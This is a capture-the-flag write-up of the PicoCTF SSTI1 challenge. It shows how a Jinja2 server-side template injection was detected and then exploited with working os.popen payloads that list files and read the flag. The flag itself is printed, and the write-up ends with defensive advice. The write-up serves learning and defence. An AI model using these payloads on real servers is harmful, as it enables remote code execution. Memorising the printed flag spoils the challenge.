# **Write-up – PicoCTF / SSTI1**

## **1. Challenge Description and Objective**

The challenge provides a very minimal web page with a single input field:

```
What do you want to announce: [ input ]
```

At the bottom of the page, an important line appears:

> Announcements may only reach yourself.

This subtle clue suggests that **whatever the user inputs will be directly processed and returned by the server**, without being displayed to any other user.
Such behaviour is typically suspicious in CTFs, as it often exposes the backend template engine.

The goal of this challenge is to identify a **Server-Side Template Injection (SSTI)** vulnerability, exploit it, and extract a hidden flag stored on the server’s filesystem.

---

## **2. Reconnaissance – Detecting the SSTI Vulnerability**

Before attempting anything complex, the first step is always to test how the server handles simple expressions.
A classic probe for SSTI detection is injecting a mathematical expression:

```
{{ 7*7 }}
```

If the server processes this expression using a templating engine, the output will not be the string literal `{{ 7*7 }}`, but the result of the computation.
Testing it reveals:

```
49
```

This confirms several things:

* The user input is passed directly into a server-side template.
* The template engine **evaluates expressions**.
* The syntax strongly points to **Jinja2**, the templating engine typically used with Flask in PicoCTF challenges.

This means we have full SSTI — the most powerful and dangerous type of template injection.

---

## **3. Understanding Jinja2’s Internals for Exploitation**

Once a Jinja2 SSTI is confirmed, the next step is to exploit Python internals to break out of the template context and reach the underlying system.

A well-known exploitation chain involves navigating through the object hierarchy exposed by Jinja2:

```
config.__class__.__init__.__globals__
```

This path gives access to the **global variables** used inside the configuration class, including the imported Python modules. The one that interests us the most is:

```
os
```

With the `os` module, we can execute commands on the server using `popen()`:

```
config.__class__.__init__.__globals__['os'].popen('COMMAND').read()
```

This allows arbitrary command execution, making the challenge equivalent to a remote shell with limited permissions.

---

## **4. Enumerating Files on the Server**

Before reading the flag, it’s essential to enumerate the current working directory to identify filenames.

To list all files:

```
{{ config.__class__.__init__.__globals__['os'].popen('ls -la').read() }}
```

Why `ls -la` instead of just `ls`?

* `ls -la` displays **hidden files**
* It provides **permissions**, **ownership**, and **file sizes**
* It ensures nothing is missed, even oddly named files

CTF authors sometimes throw misleading filenames or hide the flag in unconventional paths, so thorough enumeration matters.

In this challenge, the directory listing confirms the presence of a file with “flag” in its name.

---

## **5. Extracting the Flag**

Once the filename is known — or if you want to speed things up — you can use wildcard expansion to read any file containing the word “flag”:

```
{{ config.__class__.__init__.__globals__['os'].popen('cat *flag*').read() }}
```

This approach is convenient because:

* PicoCTF typically names flags in a predictable way.
* It avoids hard-coding filenames.
* It handles slight variations between challenge instances.

### **Output:**

```
picoCTF{s4rv3r_s1d3_t3mp14t3_1nj3ct10n5_4r3_c001_f5438664}
```

Flag successfully retrieved.

---

## **6. Why XSS Would Not Work Here**

Some challenges use XSS with an admin bot to visit pages and leak data, but this challenge explicitly prevents that.

The phrase:

> Announcements may only reach yourself.

means:

* There is **no admin**, **no bot**, and **no other user** who will load your payload.
* Any XSS payload only executes **in your own browser**, without access to privileged routes.
* Nothing client-side can access `/flag`, as it is strictly a server-side resource.

Therefore:

 **Only a server-side vulnerability (like SSTI) can retrieve the flag.**
 **XSS is completely useless in this context.**

---

## **7. Defensive Considerations (Blue Team Perspective)**

If this were a real application, the vulnerability would be severe. The fix would focus on breaking the execution chain at multiple levels.

### **Primary Protections**

* **NEVER** render user-controlled input directly inside a template.
* Use **autoescaping** to prevent evaluation of HTML or code.
* Sanitize dangerous patterns such as:

  * `{{`
  * `{%`
  * `.__class__`
  * `__globals__`
* Avoid using template engines to process untrusted content.

### **Stronger Safeguards**

* Implement a sandboxed template environment.
* Disable or restrict Jinja2’s ability to access Python internals.
* Wrap user-generated content in `{{ content | e }}` to escape special characters.
* Use a strict "allow list" of operations if dynamic rendering is required.

A failure at any of these steps can lead directly to remote code execution — exactly what happened in this challenge.

---

##  **8. Quick Summary Table**

| Step | Action                                        |
| ---- | --------------------------------------------- |
| 1    | Test `{{7*7}}` → output = 49 → SSTI confirmed |
| 2    | Identify Jinja2 as the engine                 |
| 3    | Use Python object traversal to access `os`    |
| 4    | Execute `ls -la` to list files                |
| 5    | Execute `cat *flag*` to extract flag          |
| 6    | Retrieve the PicoCTF flag                     |

---

## **Final Thoughts**

This challenge is a classic introduction to **Server-Side Template Injection** and demonstrates how dangerous template misconfigurations can be.
Even a small input field — if improperly sanitized — can give attackers full access to the server environment.

This is why SSTI has become one of the most feared vulnerability classes in modern web applications.
